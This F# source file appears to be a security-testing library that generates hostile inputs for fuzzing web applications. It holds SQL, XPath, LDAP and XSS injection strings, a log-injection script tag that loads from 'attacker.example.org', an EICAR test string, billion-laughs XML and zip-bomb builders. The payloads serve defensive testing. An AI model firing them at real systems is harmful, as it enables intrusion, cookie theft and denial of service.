namespace FSecurity

/// Representation of a size indication (MB, GB, ...)
type Metric = MB | GB

/// Module that holds the security testing functionality
module FSec = 
    open System
    open System.IO
    open System.Collections.Generic
    open FsCheck
    open ICSharpCode.SharpZipLib.Zip
  
    /// XPath input generator that provides malformed XPath inputs that can be used to discover XPath vulnerabilities.
    /// XPath is a "simple" language to locate information in an XML document. 
    /// Similar to SQL Injection, XPath Injection attacks occur when an application uses user-supplied information 
    /// to construct an XPath query for XML data. By sending intentionally malformed information into the application, 
    /// an attacker can find out how the XML data is structured, or access data that he may not normally have access to.
    /// (more info: https://www.owasp.org/index.php/XPATH_Injection)
    ///
    /// _Severity_: Critical <br/>
    /// _Vulnerability Indicators_: incorrect/invalid syntax, syntax error, runtime errors, XPathException, System.Xml.XPath 
    [<CompiledName("XPathInject")>]
    let xpathInject =
        Gen.elements 
            [ "1' or 1=1"
              "a%' or '1' = '1"
              "' or '1' = '1"
              "'a or 1=1 or 'a'='a" ]

    /// XSS (Cross Site Scripting) input generator that provides malformed inputs that can be used to discover XSS vulnerabilities.
    /// Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign 
    /// and trusted web sites. (more info: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
    ///
    /// _Severity_: Critical <br/>
    /// _Vulnerability Indicators_: payload exists in response
    [<CompiledName("XssInject")>]
    let xssInject =
        Gen.elements 
            [ "<script>alert(1)</script>"
              "<img src=x onerror=alert(1)>"
              "1\"><script>alert(document.cookie)</script>" ]

    /// SQL input generator that provides malformed inputs that can be used to discover SQL vulnerabilities.
    /// A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. 
    /// A successful SQL injection exploit can read sensitive data from the database, modify database data, 
    /// execute administration operations on the database etc. (more info: https://www.owasp.org/index.php/SQL_Injection)
    ///<br/>
    /// _Severity_: Critical <br/>
    /// _Vulnerability Indicators_: incorrect/invalid syntax, syntax error, runtime errors, invalid SQL statement, conversion failed, SQLite exception, cannot open database, System.Data.SqlException, ...
    [<CompiledName("SqlInject")>]
    let sqlInject =
        Gen.elements 
            [ "'"
              "\""
              "'\""
              ";"
              ")" 
              "(" 
              "--" 
              "1' or 1=1--"
              "a%' or 1=1--"
              "1' or 1=1"
              "a%' or 1=1"
              "999999 or 1=1 or 1=1"
              "' or 1=1 or '1'='1"
              "\" or 1=1 or \"1\"=\"1"
              "999999) or 1=1 or (1=1"
              "') or 1=1 or ('1'='1"
              "\") or 1=1 or (\"1\"=\"1"
              "999999)) or 1=1 or ((1=1"
              "')) or 1=1 or (('1'='1"
              "\")) or 1=1 or ((\"1\"=\"1"
              "999999))) or 1=1 or (((1"
              "'))) or 1=1 or ((('1'='1"
              "))) or 1=1 or (((\"1\"=\"1" ]

    /// LDAP input generator that provides LDAP injection strings. 
    /// When receiving an "unusable" response from the SUT, it may be vulnerable for LDAP injection.
    /// An "unusable" response could be a random user record, list of users, ...
    /// LDAP is a lightweight system to manage credentials and authenticating users. 
    /// When a application is vulnerable to LDAP injection, a malicious user may can query
    /// sensitive data from other or even modify/delete it entirely.
    ///
    /// _Severity_: Critical <br/>
    /// _Vulnerability Indicators_: unusable responses
    [<CompiledName("LdapInject")>]
    let ldapInject =
        Gen.elements
            [ "*"; "*)(|(cn=*"; "*)(|(cn=*)"; "*)(|(cn=*))" ]

    /// LDAP input generator with a specified 'normal input' that provides LDAP injection strings.
    /// The 'normal input' should be something legitimate.
    /// When receiving an "unusable" response from the SUT, it may be vulnerable for LDAP injection.
    /// An "unusable" response could be a random user record, list of users, ...
    /// LDAP is a lightweight system to manage credentials and authenticating users. 
    /// When a application is vulnerable to LDAP injection, a malicious user may can query
    /// sensitive data from other or even modify/delete it entirely.
    ///
    /// _Severity_: Critical <br/>
    /// _Vulnerability Indicators_: unusable responses
    [<CompiledName("LdapWithNormalInject")>]
    let ldapWithNormalInject x =
        Gen.oneof 
            [ ldapInject
              Gen.elements 
                [ sprintf "%s)(|(cn=*" x
                  sprintf "%s)(|(cn=*)" x 
                  sprintf "%s)(|(cn=*))" x ] ]

    /// Log input generator to test log injection vulnerability. Inputs that are most-likely be logged can be vulnerable for injection.
    /// This generator will give you injection strings that will try to inject layout with xterm, XSS injection and add additional lines in a xterm environment
    /// with the text 'User admin logged in'.
    [<CompiledName("LogInject")>]
    let logInject =
        Gen.elements
            [ "%1B%5B%32%4A"
              "%0AUser admin logged in"
              """<script src="http://attacker.example.org/xss_exploit.js"/>""" ]

    let private guid () = Guid.NewGuid().ToString()
    let private (</>) x y = Path.Combine (x, y)

    /// Creates a file for a given size stored at a given directory.
    /// ## Parameters
    /// - `dir` - Location of where the file should be stored
    /// - `x` - Value to define the file size (in MB or GB)
    /// - `m` - Metric to define the Unit of the file size
    [<CompiledName("FileOfSize")>]
    let fileOfSize x (m : Metric) (dir : DirectoryInfo) =
        let size = match m with MB -> 1048576L | GB -> 1073741824L
        let path = dir.FullName </> guid() + ".test"
        use fs = File.Create path
        fs.Seek (int64 x * size, SeekOrigin.Begin) |> ignore
        fs.WriteByte 0uy
        FileInfo path

    /// Creates a zip file bomb having a depth and width representing the different levels the zip bomb should have.
    /// ## Parameters
    /// - `depth` - Represent the depth of the zip bomb: how many levels should the zip bomb have?
    /// - `width` - Represent the width of the zip bomb: how many files should there be on each depth-level?
    /// - `start` - Represent the start file of the zip bomb. This file is copied over and over to create the zip bomb.
    [<CompiledName("ZipBombDepthWidth")>]
    let zipBombDepthWidth depth width (start : FileInfo) =
        let mkFileName ext = guid() + ext
        let zipFiles xs =
            let fileName = start.Directory.FullName </> mkFileName ".zip"
            use zip = new ZipOutputStream (File.Create fileName)
            for fi in xs do
                using (File.Open (fi, FileMode.Open)) (fun src ->
                zip.PutNextEntry (Path.GetFileName fi |> ZipEntry)
                src.CopyTo zip
                zip.CloseEntry ())
                File.Delete fi
            fileName

        let copyFileN n src =
            let xs = List.init n (fun _ -> mkFileName ".zip")
            for des in xs do File.Copy (src, des)
            File.Delete src; xs

        let rec mkBomb depth width bomb =
            if depth = 0 then bomb else
            copyFileN width bomb
            |> zipFiles
            |> mkBomb (depth - 1) width

        zipFiles [start.FullName]
        |> mkBomb depth width

    /// Illegal file name generator to validate the file uploading mechanism.
    /// Generate file names with semicolons, reserved names, percent sign, ampersand, ...
    [<CompiledName("FileIllegalNames")>]
    let fileIllegalNames =
        Gen.elements 
            [ "a:b.txt"     // Colon not allowed on most OSes
              "a;b.txt"     // Semicolon deprecated on most OSes
              "123456789012345678901234567890123456789012345678900123456.txt" // > 64 characters doesn't work on older file systems
              "File."       // Windows may discard final period
              "CON"         // Reserved name in Windows
              "a/b.txt"     // does this create a file named b.txt?
              "a\\b.txt"    // again, what does this do?
              "a&b.txt"     // ampersand can be interpreted by OS
              "a\%b.txt"    // percent is variable marker in Windows
              String.replicate 255 "A" + ".txt" ]

    /// Eicar virus represented as a stream containing the virus content.
    /// For more info about the Eicar virus: http://www.eicar.org/86-0-Intended-use.html
    [<CompiledName("EicarVirus")>]
    let eicarVirus = (fun () ->
        let eicar = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        new MemoryStream (System.Text.Encoding.UTF8.GetBytes eicar) :> Stream) ()

    /// XML Bomb input generator: An XML bomb is a message composed and sent with the intent of overloading an XML parser (typically HTTP server). 
    /// It is block of XML that is both well-formed and valid according to the rules of an XML schema. 
    /// It is a type of XML Denial of Service (DoS) attack. (more info: https://en.wikipedia.org/wiki/Billion_laughs)
    ///
    /// _Severity_: Critical
    /// _Vulnerability Indicators_: timeout
    [<CompiledName("XmlBomb")>]
    let xmlBomb =
        let xml =  
            """<?xml version="1.0"?>
               <!DOCTYPE root [
               <!ELEMENT root (#PCDATA)>
               <!ENTITY  ha0 "Ha !">"""
        let xs l = 
            [1..l]
            |> List.map (fun i ->
                sprintf "<!ENTITY ha%i \"&ha%i;&ha%i;\" >" i (i-1) (i-1))
            |> List.reduce (+)

        Gen.choose (30, 100)
        |> Gen.map (fun l ->
            sprintf "%s%s]><root>&ha%i;</root>" xml (xs l) l)

    /// Malicious XML generator: generates a XML structure with a specified depth and tag length to detect failures in naive XML parsing implementations.
    /// ## Parameters
    /// - `depth` - Defines the depth of the XML document
    /// - `tagLen` - Defines the length of the tag names
    [<CompiledName("XmlMaliciousDepthTagLen")>]
    let xmlMaliciousDepthTagLen depth tagLen =
        let randomAttrOfLength l =
            [1..l]
            |> Seq.fold (fun acc x -> sprintf "%s a%i=\"%i\"" acc x x) ""
            |> Gen.constant
            |> Gen.listOfLength depth;

        let randomTag = 
            Gen.elements [ 'a'..'z' ]
            |> Gen.listOfLength tagLen
            |> Gen.map (Seq.map string >> Seq.reduce (+))
        
        randomTag
        |> Gen.listOfLength depth
        |> Gen.zip (Gen.choose (100, 1000) >>= randomAttrOfLength)
        |> Gen.map (fun (attrs, xs) ->
            [ yield "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
              yield! attrs |> Seq.map2 (sprintf "<%s %s>") xs
              yield! xs |> Seq.rev |> Seq.map (sprintf "</%s>") ]
            |> Seq.reduce (+))

    /// Malicious XML generator: generates a XML structure with a depth of 1-100, a tag length of 100-1000 and a attribute count of 100-100.
    /// With this generator you can detect failures in naive XML parsers.
    [<CompiledName("XmlMalicious")>]
    let xmlMalicious = 
        Gen.choose (100, 1000) 
        |> Gen.zip (Gen.choose (1, 100))
        >>= fun (tagLen, depth) -> xmlMaliciousDepthTagLen tagLen depth

    /// Generates an url with hidden specified query parameters: `admin=true`, `debug=true`.
    /// ## Parameters
    /// - `baseUrl` - The base URL to add the generated query parameters
    [<CompiledName("UrlHiddenAdmin")>]
    let urlHiddenAdmin baseUrl =
        Gen.elements [ "admin=true"; "debug=true" ]
        |> Gen.map (sprintf """%s?%s""" baseUrl)

    /// Generates an url with a specified number of query parameters each with its own generator.
    /// ## Parameters
    /// - `baseUrl` - The base URL to add the generated query parameters
    /// - `args` - Map containing a query parameter names and their generator for its value
    [<CompiledName("UrlTampered")>]
    let urlTampered baseUrl args =
        args
        |> Map.map (fun k v -> 
            Gen.map (sprintf """%s=%A""" k) v)
        |> Map.fold (fun acc _ v -> v :: acc) []
        |> List.rev
        |> Gen.sequenceToSeq
        |> Gen.map (
            Seq.reduce (sprintf """%s&%s""")
            >> sprintf """%s?%s""" baseUrl)

    /// Generates an url with injected JavaScript for the given query parameters.
    /// ## Parameters
    /// - `baseUrl` - The base URL to add the injection
    /// - `args` - List containing all the query parameter names
    [<CompiledName("UrlInject")>]
    let urlInject baseUrl args =
        args
        |> List.map (fun a -> a, xssInject)
        |> Map.ofList
        |> urlTampered baseUrl

    /// Generates an url with an additional "bogus" query parameters added to the specified base url.
    /// ## Parameters
    /// - `baseUrl` - The base URL to add the generated query parsameters
    /// - `args` - Map containing a query parameter names and their generator for its value
    [<CompiledName("UrlBogus")>]
    let urlBogus baseUrl args =
        let appendMap = Map.fold (fun acc k v ->
            match Map.tryFind k acc with
            | Some _ -> acc
            | None -> Map.add k v acc)

        let bogus =
            List.zip [ 'a'..'z' ] [ 1..26 ]
            |> List.map (fun (x, y) -> sprintf "%c%07i" x y)
            |> fun xs ->
                Gen.choose (1, 25)
                |> Gen.map (fun i -> List.take i xs)
            |> Gen.map (fun xs ->
                xs |> List.map (fun x -> x, Arb.generate<'a>)
                   |> Map.ofList
                   |> appendMap args)
        bogus >>= urlTampered baseUrl

    /// Generates an url with an additional "bogus" query parameters added to the specified base url.
    /// ## Parameters
    /// - `baseUrl` - The base URL to add the generated query parsameters
    /// - `args` - Map containing a query parameter names and their generator for its value
    [<CompiledName("UrlBogus")>]
    let urlBogusDict baseUrl (args : IDictionary<string, Gen<_>>) =
        (args :> seq<_>)
        |> Seq.map (|KeyValue|)
        |> Map.ofSeq
        |> urlBogus baseUrl